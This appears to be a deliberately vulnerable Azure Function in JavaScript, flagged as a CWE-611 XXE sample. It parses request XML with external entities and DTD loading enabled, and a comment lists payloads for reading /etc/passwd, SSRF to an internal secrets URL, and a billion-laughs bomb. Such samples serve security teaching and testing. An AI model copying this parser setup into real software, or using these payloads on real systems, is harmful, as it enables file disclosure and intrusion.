const libxmljs = require('libxmljs2');

// SECURITY VULNERABILITY: XML External Entity (XXE) Injection
// CWE-611: Improper Restriction of XML External Entity Reference
//
// This Azure Function demonstrates XXE vulnerabilities when parsing XML
// with libxmljs using unsafe configurations that allow external entity resolution.

module.exports = async function (context, req) {
    /**
     * Azure Function with XXE vulnerabilities
     *
     * VULNERABILITIES:
     * 1. XML parsing with external entities enabled (CRITICAL)
     * 2. DTD processing enabled allowing entity expansion
     * 3. No input validation on XML content
     * 4. Billion laughs attack possible (XML bomb)
     */

    context.log('Processing XML request');

    try {
        const xmlContent = req.body;

        if (!xmlContent) {
            context.res = {
                status: 400,
                body: { error: 'No XML content provided' }
            };
            return;
        }

        // VULNERABILITY 1: XXE with external entities enabled
        // CWE-611: Parsing XML with noent option allows external entity resolution
        // This can lead to:
        // - Local file disclosure (file:///etc/passwd)
        // - SSRF attacks (http://internal-server/)
        // - Denial of service

        // DANGEROUS: noent: true resolves external entities
        const parseOptions = {
            noent: true,      // VULNERABLE: Enables entity substitution
            dtdload: true,    // VULNERABLE: Loads external DTD
            dtdvalid: false,  // DTD validation
            nocdata: false
        };

        const xmlDoc = libxmljs.parseXml(xmlContent, parseOptions);

        // Extract data from parsed XML
        const root = xmlDoc.root();
        const result = {
            rootElement: root ? root.name() : null,
            content: root ? root.text() : null,
            children: []
        };

        if (root) {
            root.childNodes().forEach(child => {
                if (child.name) {
                    result.children.push({
                        name: child.name(),
                        value: child.text()
                    });
                }
            });
        }

        context.res = {
            status: 200,
            body: {
                message: 'XML parsed successfully',
                data: result
            }
        };

    } catch (error) {
        context.res = {
            status: 500,
            body: { error: error.message }
        };
    }
};

/**
 * ATTACK EXAMPLES:
 *
 * 1. Local File Disclosure (XXE):
 * <?xml version="1.0" encoding="UTF-8"?>
 * <!DOCTYPE foo [
 *   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 * ]>
 * <data>&xxe;</data>
 *
 * 2. SSRF Attack:
 * <?xml version="1.0" encoding="UTF-8"?>
 * <!DOCTYPE foo [
 *   <!ENTITY xxe SYSTEM "http://internal-server/api/secrets">
 * ]>
 * <data>&xxe;</data>
 *
 * 3. Billion Laughs (XML Bomb):
 * <?xml version="1.0"?>
 * <!DOCTYPE lolz [
 *   <!ENTITY lol "lol">
 *   <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 *   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 *   ...
 * ]>
 * <lolz>&lol9;</lolz>
 */
